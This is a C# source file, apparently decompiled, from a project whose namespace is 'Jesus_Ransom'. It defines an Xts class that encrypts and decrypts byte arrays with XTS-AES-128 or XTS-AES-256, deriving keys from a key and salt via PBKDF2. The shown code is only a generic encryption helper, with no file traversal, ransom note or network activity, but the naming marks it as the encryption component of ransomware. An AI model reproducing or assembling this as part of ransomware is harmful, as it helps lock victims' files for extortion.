using System.IO;
using System.Security.Cryptography;
using XTSSharp;

namespace Jesus_Ransom;

public class Xts
{
	public static byte[] Encrypt(byte[] inpute, byte[] key, byte[] salt, Algorithm Algorithm = Algorithm.XtsAes256)
	{
		if (Algorithm == Algorithm.XtsAes128)
		{
			byte[] array = new byte[inpute.Length];
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(key, salt, 1000);
			byte[] bytes = rfc2898DeriveBytes.GetBytes(16);
			byte[] bytes2 = rfc2898DeriveBytes.GetBytes(16);
			XTSSharp.Xts xts = XtsAes128.Create(bytes, bytes2);
			using XtsCryptoTransform xtsCryptoTransform = xts.CreateEncryptor();
			int count = xtsCryptoTransform.TransformBlock(inpute, 0, inpute.Length, array, 0, 1000uL);
			using MemoryStream input = new MemoryStream(array);
			BinaryReader binaryReader = new BinaryReader(input);
			return binaryReader.ReadBytes(count);
		}
		byte[] array2 = new byte[inpute.Length];
		Rfc2898DeriveBytes rfc2898DeriveBytes2 = new Rfc2898DeriveBytes(key, salt, 1000);
		byte[] bytes3 = rfc2898DeriveBytes2.GetBytes(32);
		byte[] bytes4 = rfc2898DeriveBytes2.GetBytes(32);
		XTSSharp.Xts xts2 = XtsAes256.Create(bytes3, bytes4);
		using XtsCryptoTransform xtsCryptoTransform2 = xts2.CreateEncryptor();
		int count2 = xtsCryptoTransform2.TransformBlock(inpute, 0, inpute.Length, array2, 0, 1000uL);
		using MemoryStream input2 = new MemoryStream(array2);
		BinaryReader binaryReader2 = new BinaryReader(input2);
		return binaryReader2.ReadBytes(count2);
	}

	public static byte[] Decrypt(byte[] inpute, byte[] key, byte[] salt, Algorithm Algorithm = Algorithm.XtsAes256)
	{
		if (Algorithm == Algorithm.XtsAes128)
		{
			byte[] array = new byte[inpute.Length];
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(key, salt, 1000);
			byte[] bytes = rfc2898DeriveBytes.GetBytes(16);
			byte[] bytes2 = rfc2898DeriveBytes.GetBytes(16);
			XTSSharp.Xts xts = XtsAes128.Create(bytes, bytes2);
			using XtsCryptoTransform xtsCryptoTransform = xts.CreateDecryptor();
			int count = xtsCryptoTransform.TransformBlock(inpute, 0, inpute.Length, array, 0, 1000uL);
			using MemoryStream input = new MemoryStream(array);
			BinaryReader binaryReader = new BinaryReader(input);
			return binaryReader.ReadBytes(count);
		}
		byte[] array2 = new byte[inpute.Length];
		Rfc2898DeriveBytes rfc2898DeriveBytes2 = new Rfc2898DeriveBytes(key, salt, 1000);
		byte[] bytes3 = rfc2898DeriveBytes2.GetBytes(32);
		byte[] bytes4 = rfc2898DeriveBytes2.GetBytes(32);
		XTSSharp.Xts xts2 = XtsAes256.Create(bytes3, bytes4);
		using XtsCryptoTransform xtsCryptoTransform2 = xts2.CreateDecryptor();
		int count2 = xtsCryptoTransform2.TransformBlock(inpute, 0, inpute.Length, array2, 0, 1000uL);
		using MemoryStream input2 = new MemoryStream(array2);
		BinaryReader binaryReader2 = new BinaryReader(input2);
		return binaryReader2.ReadBytes(count2);
	}
}
